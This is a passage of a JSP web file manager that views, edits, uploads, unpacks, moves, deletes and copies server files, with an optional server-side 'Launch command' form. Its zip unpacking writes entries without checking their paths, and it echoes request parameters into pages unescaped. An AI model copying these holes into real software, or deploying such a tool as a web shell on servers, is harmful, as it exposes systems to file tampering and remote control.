        request.setAttribute("error", "Error " + e + ". Upload aborted");
        error = true;
    }
    if (!error) request.setAttribute("message", "File upload correctly finished.");
}
else if (request.getParameter("editfile") != null) {
    File ef = new File(request.getParameter("editfile"));
    if (!isAllowed(ef)) {
        request.setAttribute("error", "You are not allowed to access " + ef.getAbsolutePath());
    } else {
%>
<title>Edit <%=conv2Html(request.getParameter("editfile"))%>
</title>
</head>
<body>
<%
    BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(ef),"UTF-8"));
    String disable = "";
    if (!ef.canWrite()) disable = " readonly";
    out.println("<form action=\"" + browser_name + "\" method=\"Post\">\n"
            + "<textarea name=\"text\" wrap=\"off\" cols=\"" + EDITFIELD_COLS
            + "\" rows=\"" + EDITFIELD_ROWS + "\"" + disable + ">");
    String c;
    int i;
    boolean dos = false;
    boolean cr = false;
    while ((i = reader.read()) >= 0) {
        out.print(conv2Html(i));
        if (i == '\r') cr = true;
        else if (cr && (i == '\n')) dos = true;
        else cr = false;
    }
    reader.close();
    request.setAttribute("dir", null);
    dir_view = false;
    out.println("</textarea>");
%>

<input type="hidden" name="nfile" value="<%= request.getParameter("editfile")%>">
<br>
<table>
    <tr>
        <td><input type="radio" name="lineformat" value="dos" <%= dos?"checked":""%>>Ms-Dos/Windows</td>
        <td><input type="radio" name="lineformat" value="unix" <%= dos?"":"checked"%>>Unix</td>
        <td><input type="checkbox" name="Backup">Write backup</td>
    </tr>
    <tr>
        <td title="Enter the new filename"><input type="text" name="new_name" value="<%=ef.getName()%>"></td>
        <td><input type="Submit" name="Submit" value="Save"></td>
        <td><input type="Submit" name="Submit" value="Cancel">
            <input type="hidden" name="sort" value="<%=request.getParameter("sort")%>">
        </td>
    </tr>
</table>
</form>
</body>
</html>
<%
        }
    }
    else if (request.getParameter("nfile") != null) {
        File f = new File(request.getParameter("nfile"));
        File new_f = new File(getDir(f.getParent(), request.getParameter("new_name")));
        if (!isAllowed(new_f)) {
            request.setAttribute("error", "You are not allowed to access " + new_f.getAbsolutePath());
        } else if (request.getParameter("Submit").equals("Save")) {
            if (new_f.exists() && new_f.canWrite() && request.getParameter("Backup") != null) {
                File bak = new File(new_f.getAbsolutePath() + ".bak");
                bak.delete();
                new_f.renameTo(bak);
            }
            if (new_f.exists() && !new_f.canWrite()) request.setAttribute("error",
                    "Cannot write to " + new_f.getName() + ", file is write protected.");
            else {
                BufferedWriter outs = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new_f),"UTF-8"));
                StringReader text = new StringReader(request.getParameter("text"));
                int i;
                boolean cr = false;
                String lineend = "\n";
                if (request.getParameter("lineformat").equals("dos")) lineend = "\r\n";
                while ((i = text.read()) >= 0) {
                    if (i == '\r') cr = true;
                    else if (i == '\n') {
                        outs.write(lineend);
                        cr = false;
                    } else if (cr) {
                        outs.write(lineend);
                        cr = false;
                    } else {
                        outs.write(i);
                        cr = false;
                    }
                }
                outs.flush();
                outs.close();
            }
        }
        request.setAttribute("dir", f.getParent());
    }
    else if (request.getParameter("unpackfile") != null) {
        File f = new File(request.getParameter("unpackfile"));
        String root = f.getParent();
        request.setAttribute("dir", root);
        if (!isAllowed(new File(root))) {
            request.setAttribute("error", "You are not allowed to access " + root);
        }
        else if (!f.exists()) {
            request.setAttribute("error", "Cannot unpack " + f.getName()
                    + ", file does not exist");
        }
        else if (!f.getParentFile().canWrite()) {
            request.setAttribute("error", "Cannot unpack " + f.getName()
                    + ", directory is write protected.");
        }
        else if (f.getName().toLowerCase().endsWith(".gz")) {
            String newName = f.getAbsolutePath().substring(0, f.getAbsolutePath().length() - 3);
            try {
                byte buffer[] = new byte[0xffff];
                copyStreams(new GZIPInputStream(new FileInputStream(f)), new FileOutputStream(
                        newName), buffer);
            } catch (IOException ex) {
                request.setAttribute("error", "Unpacking of " + f.getName()
                        + " aborted. Error: " + ex);
            }
        }
        else {
            try {
                ZipFile zf = new ZipFile(f);
                Enumeration entries = zf.entries();
                boolean error = false;
                while (entries.hasMoreElements()) {
                    ZipEntry entry = (ZipEntry) entries.nextElement();
                    if (!entry.isDirectory()
                            && new File(root + File.separator + entry.getName()).exists()) {
                        request.setAttribute("error", "Cannot unpack " + f.getName()
                                + ", File " + entry.getName() + " already exists.");
                        error = true;
                        break;
                    }
                }
                if (!error) {
                    entries = zf.entries();
                    byte buffer[] = new byte[0xffff];
                    while (entries.hasMoreElements()) {
                        ZipEntry entry = (ZipEntry) entries.nextElement();
                        File n = new File(root + File.separator + entry.getName());
                        if (entry.isDirectory()) n.mkdirs();
                        else {
                            n.getParentFile().mkdirs();
                            n.createNewFile();
                            copyStreams(zf.getInputStream(entry), new FileOutputStream(n),
                                    buffer);
                        }
                    }
                    zf.close();
                    request.setAttribute("message", "Unpack of " + f.getName()
                            + " was successful.");
                }
            } catch (ZipException ex) {
                request.setAttribute("error", "Cannot unpack " + f.getName()
                        + ", no valid zip file");
            } catch (IOException ex) {
                request.setAttribute("error", "Unpacking of " + f.getName()
                        + " aborted. Error: " + ex);
            }
        }
    }
    else if ((request.getParameter("Submit") != null)
            && (request.getParameter("Submit").equals(DELETE_FILES))) {
        Vector v = expandFileList(request.getParameterValues("selfile"), true);
        boolean error = false;
        for (int i = v.size() - 1; i >= 0; i--) {
            File f = (File) v.get(i);
            if (!isAllowed(f)) {
                request.setAttribute("error", "You are not allowed to access " + f.getAbsolutePath());
                error = true;
                break;
            }
            if (!f.canWrite() || !f.delete()) {
                request.setAttribute("error", "Cannot delete " + f.getAbsolutePath()
                        + ". Deletion aborted");
                error = true;
                break;
            }
        }
        if ((!error) && (v.size() > 1)) request.setAttribute("message", "All files deleted");
        else if ((!error) && (v.size() > 0)) request.setAttribute("message", "File deleted");
        else if (!error) request.setAttribute("error", "No files selected");
    }
    else if ((request.getParameter("Submit") != null)
            && (request.getParameter("Submit").equals(CREATE_DIR))) {
        String dir = "" + request.getAttribute("dir");
        String dir_name = request.getParameter("cr_dir");
        String new_dir = getDir(dir, dir_name);
        if (!isAllowed(new File(new_dir))) {
            request.setAttribute("error", "You are not allowed to access " + new_dir);
        } else if (new File(new_dir).mkdirs()) {
            request.setAttribute("message", "Directory created");
        } else request.setAttribute("error", "Creation of directory " + new_dir + " failed");
    }
    else if ((request.getParameter("Submit") != null)
            && (request.getParameter("Submit").equals(CREATE_FILE))) {
        String dir = "" + request.getAttribute("dir");
        String file_name = request.getParameter("cr_dir");
        String new_file = getDir(dir, file_name);
        if (!isAllowed(new File(new_file))) {
            request.setAttribute("error", "You are not allowed to access " + new_file);
        }
        else if (!"".equals(file_name.trim()) && !file_name.endsWith(File.separator)) {
            if (new File(new_file).createNewFile()) request.setAttribute("message",
                    "File created");
            else request.setAttribute("error", "Creation of file " + new_file + " failed");
        } else request.setAttribute("error", "Error: " + file_name + " is not a valid filename");
    }
    else if ((request.getParameter("Submit") != null)
            && (request.getParameter("Submit").equals(RENAME_FILE))) {
        Vector v = expandFileList(request.getParameterValues("selfile"), true);
        String dir = "" + request.getAttribute("dir");
        String new_file_name = request.getParameter("cr_dir");
        String new_file = getDir(dir, new_file_name);
        if (!isAllowed(new File(new_file))) {
            request.setAttribute("error", "You are not allowed to access " + new_file);
        }
        else if (v.size() <= 0) request.setAttribute("error",
                "Select exactly one file or folder. Rename failed");
        else if ((v.size() > 1) && !(((File) v.get(0)).isDirectory())) request.setAttribute(
                "error", "Select exactly one file or folder. Rename failed");
        else if ((v.size() > 1) && ((File) v.get(0)).isDirectory()
                && !(((File) v.get(0)).getPath().equals(((File) v.get(1)).getParent()))) {
            request.setAttribute("error", "Select exactly one file or folder. Rename failed");
        } else {
            File f = (File) v.get(0);
            if (!isAllowed(f)) {
                request.setAttribute("error", "You are not allowed to access " + f.getAbsolutePath());
            }
            else if ((new_file.trim() != "") && !new_file.endsWith(File.separator)) {
                if (!f.canWrite() || !f.renameTo(new File(new_file.trim()))) {
                    request.setAttribute("error", "Creation of file " + new_file + " failed");
                } else request.setAttribute("message", "Renamed file "
                        + ((File) v.get(0)).getName() + " to " + new_file);
            } else request.setAttribute("error", "Error: \"" + new_file_name
                    + "\" is not a valid filename");
        }
    }
    else if ((request.getParameter("Submit") != null)
            && (request.getParameter("Submit").equals(MOVE_FILES))) {
        Vector v = expandFileList(request.getParameterValues("selfile"), true);
        String dir = "" + request.getAttribute("dir");
        String dir_name = request.getParameter("cr_dir");
        String new_dir = getDir(dir, dir_name);
        if (!isAllowed(new File(new_dir))) {
            request.setAttribute("error", "You are not allowed to access " + new_dir);
        } else {
            boolean error = false;
            if (!new_dir.endsWith(File.separator)) new_dir += File.separator;
            for (int i = v.size() - 1; i >= 0; i--) {
                File f = (File) v.get(i);
                if (!isAllowed(f)) {
                    request.setAttribute("error", "You are not allowed to access " + f.getAbsolutePath());
                    error = true;
                    break;
                } else if (!f.canWrite() || !f.renameTo(new File(new_dir
                        + f.getAbsolutePath().substring(dir.length())))) {
                    request.setAttribute("error", "Cannot move " + f.getAbsolutePath()
                            + ". Move aborted");
                    error = true;
                    break;
                }
            }
            if ((!error) && (v.size() > 1)) request.setAttribute("message", "All files moved");
            else if ((!error) && (v.size() > 0)) request.setAttribute("message", "File moved");
            else if (!error) request.setAttribute("error", "No files selected");
        }
    }
    else if ((request.getParameter("Submit") != null)
            && (request.getParameter("Submit").equals(COPY_FILES))) {
        Vector v = expandFileList(request.getParameterValues("selfile"), true);
        String dir = (String) request.getAttribute("dir");
        if (!dir.endsWith(File.separator)) dir += File.separator;
        String dir_name = request.getParameter("cr_dir");
        String new_dir = getDir(dir, dir_name);
        if (!isAllowed(new File(new_dir))) {
            request.setAttribute("error", "You are not allowed to access " + new_dir);
        } else {
            boolean error = false;
            if (!new_dir.endsWith(File.separator)) new_dir += File.separator;
            try {
                byte buffer[] = new byte[0xffff];
                for (int i = 0; i < v.size(); i++) {
                    File f_old = (File) v.get(i);
                    File f_new = new File(new_dir + f_old.getAbsolutePath().substring(dir.length()));
                    if (!isAllowed(f_old) || !isAllowed(f_new)) {
                        request.setAttribute("error", "You are not allowed to access " + f_new.getAbsolutePath());
                        error = true;
                    } else if (f_old.isDirectory()) f_new.mkdirs();
                    else if (!f_new.exists()) {
                        copyStreams(new FileInputStream(f_old), new FileOutputStream(f_new), buffer);
                    } else {
                        request.setAttribute("error", "Cannot copy " + f_old.getAbsolutePath()
                                + ", file already exists. Copying aborted");
                        error = true;
                        break;
                    }
                }
            } catch (IOException e) {
                request.setAttribute("error", "Error " + e + ". Copying aborted");
                error = true;
            }
            if ((!error) && (v.size() > 1)) request.setAttribute("message", "All files copied");
            else if ((!error) && (v.size() > 0)) request.setAttribute("message", "File copied");
            else if (!error) request.setAttribute("error", "No files selected");
        }
    }
    if (dir_view && request.getAttribute("dir") != null) {
        File f = new File("" + request.getAttribute("dir"));
        if (!f.exists() || !isAllowed(f)) {
            if (!f.exists()) {
                request.setAttribute("error", "Directory " + f.getAbsolutePath() + " does not exist.");
            } else {
                request.setAttribute("error", "You are not allowed to access " + f.getAbsolutePath());
            }
            if (request.getAttribute("olddir") != null && isAllowed(new File((String) request.getAttribute("olddir")))) {
                f = new File("" + request.getAttribute("olddir"));
            }
            else {
                if (f.getParent() != null && isAllowed(f)) f = new File(f.getParent());
            }
            if (!f.exists()) {
                String path = null;
                if (application.getRealPath(request.getRequestURI()) != null) path = new File(
                        application.getRealPath(request.getRequestURI())).getParent();

                if (path == null)
                    path = new File(".").getAbsolutePath();
                f = new File(path);
            }
            if (isAllowed(f)) request.setAttribute("dir", f.getAbsolutePath());
            else request.setAttribute("dir", null);
        }
%>
<script type="text/javascript">
    <!--
    <%// This section contains the Javascript used for interface elements %>
    var check = false;
    <%// Disables the checkbox feature %>

    function dis() {
        check = true;
    }

    var DOM = 0, MS = 0, OP = 0, b = 0;
    <%// Determine the browser type %>

    function CheckBrowser() {
        if (b == 0) {
            if (window.opera) OP = 1;
            if (document.getElementById) DOM = 1;
            if (document.all && !OP) MS = 1;
            b = 1;
        }
    }

    <%// Allows the whole row to be selected %>

    function selrow(element, i) {
        var erst;
        CheckBrowser();
        if ((OP == 1) || (MS == 1)) erst = element.firstChild.firstChild;
        else if (DOM == 1) erst = element.firstChild.nextSibling.firstChild;
        if (i == 0) {
            if (erst.checked == true) element.className = 'mousechecked';
            else element.className = 'mousein';
        }
        else if (i == 1) {
            if (erst.checked == true) element.className = 'checked';
            else element.className = 'mouseout';
        }
        else if ((i == 2) && (!check)) {
            if (erst.checked == true) element.className = 'mousein';
            else element.className = 'mousechecked';
            erst.click();
        } else check = false;
    }

    <%//(De)select all checkboxes%>

    function AllFiles() {
        for (var x = 0; x < document.FileList.elements.length; x++) {
            var y = document.FileList.elements[x];
            var ytr = y.parentNode.parentNode;
            var check = document.FileList.selall.checked;
            if (y.name == 'selfile') {
                if (y.disabled != true) {
                    y.checked = check;
                    if (y.checked == true) ytr.className = 'checked';
                    else ytr.className = 'mouseout';
                }
            }
        }
    }

    function popUp(URL) {
        fname = document.getElementsByName("myFile")[0].value;
        if (fname != "")
            window.open(URL + "?first&uplMonitor=" + encodeURIComponent(fname), "", "width=400,height=150,resizable=yes,depend=yes")
    }
</script>
<title><%=request.getAttribute("dir")%>
</title>
</head>
<body>
<%
    if (request.getAttribute("message") != null) {
        out.println("<table border=\"0\" width=\"100%\"><tr><td class=\"message\">");
        out.println(request.getAttribute("message"));
        out.println("</td></tr></table>");
    }
    if (request.getAttribute("error") != null) {
        out.println("<table border=\"0\" width=\"100%\"><tr><td class=\"error\">");
        out.println(request.getAttribute("error"));
        out.println("</td></tr></table>");
    }
    if (request.getAttribute("dir") != null) {
%>
<form action="<%= browser_name %>" method="Post" name="FileList">
    <table class="filelist" cellspacing="1px" cellpadding="0px">
        <%
            String dir = request.getAttribute("dir")+"";
            String cmd = browser_name + "?dir=" + dir;
            int sortMode = 1;
            if (request.getParameter("sort") != null) sortMode = Integer.parseInt(request
                    .getParameter("sort"));
            int[] sort = new int[]{1, 2, 3, 4};
            for (int i = 0; i < sort.length; i++)
                if (sort[i] == sortMode) sort[i] = -sort[i];
            out.println("<tr><th width=\"20\"><input type=\"checkbox\" id=\"selall\" name=\"selall\" onClick=\"AllFiles(this.form)\"></th><th title=\"Sort files by name\" align=left><a href=\""
                    + cmd + "&amp;sort=" + sort[0] + "\">Name</a></th>"
                    + "<th title=\"Sort files by size\" align=\"right\"><a href=\"" + cmd
                    + "&amp;sort=" + sort[1] + "\">Size</a></th>"
                    + "<th title=\"Sort files by type\" align=\"center\"><a href=\"" + cmd
                    + "&amp;sort=" + sort[3] + "\">Type</a></th>"
                    + "<th title=\"Sort files by date\" align=\"left\"><a href=\"" + cmd
                    + "&amp;sort=" + sort[2] + "\">Date</a></th>"
                    + "<th>&nbsp;</th><th>&nbsp;</th></tr>");
            char trenner = File.separatorChar;
            File[] entry = File.listRoots();
            for (int i = 0; i < entry.length; i++) {
                boolean forbidden = false;
                for (int i2 = 0; i2 < FORBIDDEN_DRIVES.length; i2++) {
                    if (entry[i].getAbsolutePath().toLowerCase().equals(FORBIDDEN_DRIVES[i2])) forbidden = true;
                }
                if (!forbidden) {
                    out.println("<tr class=\"mouseout\" onmouseover=\"this.className='mousein'\""
                            + "onmouseout=\"this.className='mouseout'\">");
                    out.println("<td>&nbsp;</td><td align=left >");
                    String name = entry[i].getAbsolutePath();
                    String buf = entry[i].getAbsolutePath();
                    out.println(" &nbsp;<a href=\"" + browser_name + "?sort=" + sortMode
                            + "&amp;dir=" + name + "\">[" + buf + "]</a>");
                    out
                            .println("</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td></tr>");
                }
            }
            if (f.getParent() != null) {
                out.println("<tr class=\"mouseout\" onmouseover=\"this.className='mousein'\""
                        + "onmouseout=\"this.className='mouseout'\">");
                out.println("<td></td><td align=left>");
                out.println(" &nbsp;<a href=\"" + browser_name + "?sort=" + sortMode + "&amp;dir="
                        + f.getParent() + "\">" + FOL_IMG + "[..]</a>");
                out
                        .println("</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td></tr>");
            }
            entry = f.listFiles();
            if (entry == null) entry = new File[]{};
            long totalSize = 0;
            long fileCount = 0;
            if (entry != null && entry.length > 0) {
                Arrays.sort(entry, new FileComp(sortMode));
                for (int i = 0; i < entry.length; i++) {
                    String name = entry[i].getAbsolutePath();
                    String type = "File";
                    if (entry[i].isDirectory()) type = "DIR";
                    else {
                        String tempName = entry[i].getName().replace(' ', '_');
                        if (tempName.lastIndexOf('.') != -1) type = tempName.substring(
                                tempName.lastIndexOf('.')).toLowerCase();
                    }
                    String ahref = "<a onmousedown=\"dis()\" href=\"" + browser_name + "?sort="
                            + sortMode + "&amp;";
                    String dlink = "&nbsp;";
                    String elink = "&nbsp;";
                    String buf = conv2Html(entry[i].getName());
                    if (!entry[i].canWrite()) buf = "<i>" + buf + "</i>";
                    String link = buf;
                    if (entry[i].isDirectory()) {
                        if (entry[i].canRead() && USE_DIR_PREVIEW) {
                            File[] fs = entry[i].listFiles();
                            if (fs == null) fs = new File[]{};
                            Arrays.sort(fs, new FileComp());
                            StringBuffer filenames = new StringBuffer();
                            for (int i2 = 0; (i2 < fs.length) && (i2 < 10); i2++) {
                                String fname = conv2Html(fs[i2].getName());
                                if (fs[i2].isDirectory()) filenames.append("[" + fname + "];");
                                else filenames.append(fname + ";");
                            }
                            if (fs.length > DIR_PREVIEW_NUMBER) filenames.append("...");
                            else if (filenames.length() > 0) filenames
                                    .setLength(filenames.length() - 1);
                            link = ahref + "dir=" + name + "\" title=\"" + filenames + "\">"
                                    + FOL_IMG + "[" + buf + "]</a>";
                        } else if (entry[i].canRead()) {
                            link = ahref + "dir=" + name + "\">" + FOL_IMG + "[" + buf + "]</a>";
                        } else link = FOL_IMG + "[" + buf + "]";
                    } else if (entry[i].isFile()) {
                        totalSize = totalSize + entry[i].length();
                        fileCount = fileCount + 1;
                        if (entry[i].canRead()) {
                            dlink = ahref + "downfile=" + name + "\">Download</a>";
                            if (USE_POPUP) link = ahref + "file=" + name + "\" target=\"_blank\">"
                                    + buf + "</a>";
                            else link = ahref + "file=" + name + "\">" + buf + "</a>";
                            if (entry[i].canWrite()) {
                                if (isPacked(name, true)) elink = ahref + "unpackfile=" + name
                                        + "\">Unpack</a>";
                                else elink = ahref + "editfile=" + name + "\">Edit</a>";
                            } else {
                                if (isPacked(name, true)) elink = ahref + "unpackfile=" + name
                                        + "\">Unpack</a>";
                                else elink = ahref + "editfile=" + name + "\">View</a>";
                            }
                        } else {
                            link = buf;
                        }
                    }
                    String date = dateFormat.format(new Date(entry[i].lastModified()));
                    out.println("<tr class=\"mouseout\" onmouseup=\"selrow(this, 2)\" "
                            + "onmouseover=\"selrow(this, 0);\" onmouseout=\"selrow(this, 1)\">");
                    if (entry[i].canRead()) {
                        out
                                .println("<td align=center><input type=\"checkbox\" name=\"selfile\" value=\""
                                        + name + "\" onmousedown=\"dis()\"></td>");
                    } else {
                        out
                                .println("<td align=center><input type=\"checkbox\" name=\"selfile\" disabled></td>");
                    }
                    out.print("<td align=left> &nbsp;" + link + "</td>");
                    if (entry[i].isDirectory()) out.print("<td>&nbsp;</td>");
                    else {
                        out.print("<td align=right title=\"" + entry[i].length() + " bytes\">"
                                + convertFileSize(entry[i].length()) + "</td>");
                    }
                    out.println("<td align=\"center\">" + type + "</td><td align=left> &nbsp;" +
                            date + "</td><td>" +
                            dlink + "</td><td>" +
                            elink + "</td></tr>");
                }
            }%>
    </table>
    <p align=center>
        <b title="<%=totalSize%> bytes">
            <%=convertFileSize(totalSize)%>
        </b><b> in <%=fileCount%> files
        in <%= dir2linkdir((String) request.getAttribute("dir"), browser_name, sortMode)%>
    </b>
    </p>
    <p style="margin-top: 5px;">
        <input type="hidden" name="dir" value="<%=request.getAttribute("dir")%>">
        <input type="hidden" name="sort" value="<%=sortMode%>">
        <input title="Download selected files and directories as one zip file" class="button" id="but_Zip" type="Submit"
               name="Submit" value="<%=SAVE_AS_ZIP%>">
        <input title="Delete all selected files and directories incl. subdirs" class="button" type="Submit"
               name="Submit" value="<%=DELETE_FILES%>"
               onclick="return confirm('Do you really want to delete the entries?')">
    </p>
    <p style="margin-top: 5px;">
        <input title="Enter new dir or filename or the relative or absolute path" type="text" name="cr_dir">
        <input title="Create a new directory with the given name" class="button" type="Submit" name="Submit"
               value="<%=CREATE_DIR%>">
        <input title="Create a new empty file with the given name" class="button" type="Submit" name="Submit"
               value="<%=CREATE_FILE%>">
        <input title="Move selected files and directories to the entered path" class="button" type="Submit"
               name="Submit" value="<%=MOVE_FILES%>">
        <input title="Copy selected files and directories to the entered path" class="button" type="Submit"
               name="Submit" value="<%=COPY_FILES%>">
        <input title="Rename selected file or directory to the entered name" class="button" type="Submit" name="Submit"
               value="<%=RENAME_FILE%>">
    </p>
</form>
<form action="<%= browser_name%>" enctype="multipart/form-data" method="POST">
    <p style="margin-top: 5px;">
        <input type="hidden" name="dir" value="<%=request.getAttribute("dir")%>">
        <input type="hidden" name="sort" value="<%=sortMode%>">
        <input type="file" name="myFile">
        <input title="Upload selected file to the current working directory" type="Submit" class="button" name="Submit"
               value="Upload"
               onClick="javascript:popUp('<%= browser_name%>')">
   </p>
</form>
<% if (NATIVE_COMMANDS) {%>
<form action="<%= browser_name%>" method="POST">
    <p style="margin-top: 5px;">
        <input type="hidden" name="dir" value="<%=request.getAttribute("dir")%>">
        <input type="hidden" name="sort" value="<%=sortMode%>">
        <input type="hidden" name="command" value="">
        <input title="Launch command in current directory" type="Submit" class="button" name="Submit"
               value="Launch command">
   </p>
</form>
<%
        }
    }%>
</body>
</html><%
    }
%>
